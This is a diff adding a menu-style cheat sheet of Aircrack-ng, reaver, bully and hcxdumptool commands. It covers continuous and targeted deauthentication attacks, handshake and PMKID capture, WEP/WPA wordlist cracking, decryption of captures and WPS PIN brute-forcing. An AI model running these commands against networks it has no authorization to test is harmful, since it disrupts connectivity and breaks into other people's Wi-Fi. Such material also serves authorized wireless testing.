@@ -1,0 +1,91 @@
+# Aircrack-ng Command List
+# Format: [\] command [/] description [X] menutitlename
+
+[X] Aircrack-ng Command List
+
+[\] airmon-ng
+[/] Show wireless interfaces
+
+[\] airmon-ng start wlan0
+[/] Enable monitor mode on wlan0
+
+[\] airmon-ng stop wlan0mon
+[/] Disable monitor mode
+
+[\] airmon-ng check kill
+[/] Kill processes interfering with monitor mode
+
+[\] airodump-ng wlan0mon
+[/] Scan for nearby Wi-Fi networks
+
+[\] airodump-ng --bssid <AP_MAC> -c <channel> -w capture wlan0mon
+[/] Capture handshake from a specific AP
+
+[\] airodump-ng --encrypt wep wlan0mon
+[/] Filter for WEP networks only
+
+[\] airodump-ng --wps wlan0mon
+[/] Show WPS-enabled networks
+
+[\] aireplay-ng --deauth 10 -a <AP_MAC> wlan0mon
+[/] Send 10 deauth packets to force handshake
+
+[\] aireplay-ng --deauth 0 -a <AP_MAC> wlan0mon
+[/] Continuous deauth attack
+
+[\] aireplay-ng -0 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon
+[/] Targeted deauth attack on a specific client
+
+[\] aireplay-ng -3 -b <AP_MAC> -h <YOUR_MAC> wlan0mon
+[/] ARP replay attack (WEP)
+
+[\] aireplay-ng -1 60 -a <AP_MAC> -h <YOUR_MAC> wlan0mon
+[/] Fake authentication (WEP/WPA)
+
+[\] aircrack-ng capture.cap
+[/] Crack WEP/WPA handshake with default settings
+
+[\] aircrack-ng -w wordlist.txt capture.cap
+[/] Crack WPA/WPA2 using a wordlist
+
+[\] aircrack-ng -b <AP_MAC> -w wordlist.txt capture.cap
+[/] Crack a specific network from a capture file
+
+[\] aircrack-ng -a 1 capture.cap
+[/] Force WEP cracking mode
+
+[\] aircrack-ng -a 2 capture.cap
+[/] Force WPA/WPA2 cracking mode
+
+[\] aircrack-ng -e <ESSID> -w wordlist.txt capture.cap
+[/] Crack by ESSID instead of BSSID
+
+[\] aircrack-ng -l cracked.txt -w wordlist.txt capture.cap
+[/] Save cracked key to file
+
+[\] airdecap-ng -w <WEP_KEY> capture.cap
+[/] Decrypt WEP capture file
+
+[\] airdecap-ng -e <ESSID> -p <WPA_PASS> capture.cap
+[/] Decrypt WPA/WPA2 capture file
+
+[\] aireplay-ng --test wlan0mon
+[/] Test injection capability
+
+[\] wash -i wlan0mon
+[/] Scan for WPS-enabled routers
+
+[\] reaver -i wlan0mon -b <AP_MAC> -vv
+[/] WPS PIN attack (slow but effective)
+
+[\] bully wlan0mon -b <AP_MAC> -v
+[/] Alternative WPS attack tool
+
+[\] hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
+[/] Capture PMKID (WPA/WPA2)
+
+[\] hcxpcapngtool -o hash.hc22000 pmkid.pcapng
+[/] Convert PMKID to Hashcat format
+
+[\] aircrack-ng --help
+[/] Show help menu
